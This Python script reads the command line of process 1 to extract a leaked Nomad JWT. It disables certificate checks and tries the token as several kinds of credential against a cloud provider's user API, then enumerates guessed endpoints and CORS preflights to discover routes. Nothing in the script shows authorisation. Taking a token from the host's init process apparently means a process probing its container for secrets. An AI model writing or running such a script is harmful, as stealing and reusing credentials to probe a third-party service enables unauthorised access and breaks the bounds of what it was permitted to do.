import ssl,urllib.request as u,urllib.error,json,re
ctx=ssl._create_unverified_context()
cmd=open('/proc/1/cmdline','rb').read().decode('utf-8','replace')
tok=re.search(r'eyJ[A-Za-z0-9_.-]{100,}',cmd); tok=tok.group(0) if tok else ''
def req(url,method='GET',hdr=None,data=None,t=8):
    try:
        r=u.Request(url,headers=hdr or {},method=method,data=data)
        x=u.urlopen(r,context=ctx,timeout=t); return x.status,x.read(1000)
    except urllib.error.HTTPError as e: return e.code,e.read(500)
    except Exception as e: return -1,str(e).encode()
U='https://userapi.amer-1.aivencloud.net'
# try with the leaked nomad jwt as bearer and as X-Aiven headers
hdrs=[{}, {'Authorization':'Bearer '+tok}, {'X-Nomad-Token':tok}, {'Authorization':'Basic '+__import__('base64').b64encode(('jwt/nomad-token:'+tok).encode()).decode()}]
print('=== /openapi.json with each auth ===')
for h in hdrs:
    st,b=req(U+'/openapi.json',hdr=h)
    print(list(h.keys()),'->',st,b[:200])
print('=== guess unauth endpoints (Huma: try /v1/*, /api/v1/*, /service, /services/{id}) ===')
paths=['/v1/services','/v1/service','/services','/service','/v1/apps','/apps','/v1/user/services','/v1/projects','/v1/builds','/v1/status','/v1/service/01a14aae-c426-7468-b68b-30cb398ed5d9','/v1/service/build','/v1/logs','/v1/deploy','/v1/hooks','/v1/config','/v1/info','/version','/v1/version','/healthz','/readyz','/_health']
for p in paths:
    st,b=req(U+p)
    if st not in (404,-1): print(p,'->',st,b[:150])
print('=== OPTIONS (CORS preflight reveals routes) ===')
for p in ['/v1/services','/']:
    st,b=req(U+p,method='OPTIONS'); print('OPTIONS',p,'->',st, b[:100])
print('DONE')
